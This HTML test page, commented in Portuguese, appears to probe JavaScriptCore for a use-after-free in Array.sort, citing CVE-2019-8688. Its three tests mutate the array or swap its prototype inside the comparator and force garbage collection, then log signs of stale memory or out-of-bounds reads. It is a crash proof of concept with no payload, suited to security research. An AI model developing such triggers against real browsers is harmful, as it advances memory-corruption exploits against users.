<!DOCTYPE html>
<html>
<head><meta charset="UTF-8"><title>TEST 21 - Array.sort Re-entrant Comparator</title></head>
<body>
<h2>TEST 21 — Array.sort Re-entrant Comparator (JSC Butterfly UAF)</h2>
<p><b>Alvo:</b> crash via comparador que modifica o proprio array durante o sort</p>
<p><b>Por que crasha:</b> JSC otimiza sort assumindo que o array nao muda durante a comparacao.
Se o comparador adiciona/remove elementos, o butterfly (storage interno) e realocado.
O motor pode seguir um ponteiro para o butterfly antigo (UAF).</p>
<p><b>CVE base:</b> variante de CVE-2019-8688 (Array.sort re-entrant)</p>

<pre id="log">Pronto. Clique em um botao para iniciar.</pre>
<button onclick="runTest1()">SORT MUTANTE (adicionar elementos)</button>
<button onclick="runTest2()">SORT MUTANTE (remover elementos)</button>
<button onclick="runTest3()">SORT COM PROTO SWAP</button>

<script>
var log = document.getElementById('log');
function info(m)  { log.textContent += '\n[INFO] ' + m; }
function alerta(m){ log.textContent += '\n\n⚠ ALERTA: ' + m + '\n'; }
function ok(m)    { log.textContent += '\n[OK]   ' + m; }

function forceGC() {
  var t = []; for(var i=0;i<50000;i++) t.push({x:i}); t=null;
}

function runTest1() {
  log.textContent = '[TEST 21-A] Sort com comparador que INSERE elementos...\n';
  try {
    var arr = [];
    for(var i = 0; i < 200; i++) arr.push(i * 1.1); // array de doubles
    info('Array inicial: ' + arr.length + ' elementos (Float64 butterfly)');

    var compareCount = 0;
    var insertCount  = 0;

    arr.sort(function(a, b) {
      compareCount++;
      if(compareCount % 20 === 0) {
        // Inserir elemento durante comparacao → realloc do butterfly
        arr.push(99999.9);
        insertCount++;
        // Forcar GC imediatamente → butterfly antigo pode ser coletado
        forceGC();
      }
      return a - b;
    });

    info('Sort concluido');
    info('Comparacoes: ' + compareCount + ' | Insercoes durante sort: ' + insertCount);
    info('arr.length apos sort: ' + arr.length);
    info('arr[0]: ' + arr[0] + ' | arr[arr.length-1]: ' + arr[arr.length-1]);

    // Verificar se a ordem ficou valida
    var outOfOrder = 0;
    for(var j = 0; j < arr.length - 1; j++) {
      if(arr[j] > arr[j+1]) outOfOrder++;
    }
    if(outOfOrder > 0) {
      alerta('ORDEM INVALIDA apos sort re-entrante: ' + outOfOrder + ' posicoes fora de ordem. JIT usou butterfly stale!');
    } else {
      ok('Ordem valida - motor se protegeu. Tente TEST 21-B ou 21-C.');
    }
  } catch(e) {
    alerta('EXCECAO DURANTE SORT: ' + e.message + ' — indica crash evitado ou caminho de erro nao tratado.');
  }
}

function runTest2() {
  log.textContent = '[TEST 21-B] Sort com comparador que REMOVE elementos...\n';
  try {
    var arr = [];
    for(var i = 0; i < 500; i++) arr.push(Math.random());
    info('Array inicial: ' + arr.length + ' elementos');

    var compareCount = 0;
    var removeCount  = 0;

    arr.sort(function(a, b) {
      compareCount++;
      if(compareCount % 15 === 0 && arr.length > 10) {
        // Remover elemento do meio durante sort → butterfly shrink
        arr.splice(Math.floor(arr.length / 2), 1);
        removeCount++;
        forceGC();
      }
      return a - b;
    });

    info('Sort concluido | compareCount=' + compareCount + ' | removes=' + removeCount);
    info('arr.length final: ' + arr.length);

    // Tentar ler alem do comprimento esperado (OOB potencial)
    var oobRead = arr[arr.length + 10];
    if(oobRead !== undefined) {
      alerta('OOB READ: arr[length+10] = ' + oobRead + ' — leitura fora do bounds do butterfly!');
    } else {
      ok('arr[length+10] = undefined (sem OOB obvio)');
    }
  } catch(e) {
    alerta('EXCECAO: ' + e.message);
  }
}

function runTest3() {
  log.textContent = '[TEST 21-C] Sort com troca de prototype no comparador...\n';
  try {
    var protoA = { tag: 'A' };
    var protoB = { tag: 'B', valueOf: function(){ return Math.random(); } };

    var arr = Object.create(protoA);
    arr.length = 0;
    // Preencher como array com indices numericos
    for(var i = 0; i < 100; i++) {
      arr[i] = i * 1.1;
      arr.length++;
    }

    info('Array-like com proto A: length=' + arr.length);

    var swapped = false;
    Array.prototype.sort.call(arr, function(a, b) {
      if(!swapped) {
        swapped = true;
        Object.setPrototypeOf(arr, protoB);
        forceGC();
        info('Proto trocado para B dentro do comparador. arr.tag=' + arr.tag);
      }
      return a - b;
    });

    info('Sort concluido. arr.tag=' + arr.tag);
    var firstVal = arr[0];
    info('arr[0] = ' + firstVal);

    if(typeof firstVal === 'object' || isNaN(firstVal)) {
      alerta('arr[0] nao e number apos sort com proto swap: ' + typeof firstVal + ' = ' + firstVal);
    }
  } catch(e) {
    alerta('EXCECAO COM PROTO SWAP: ' + e.message);
  }
}
</script>
</body>
</html>
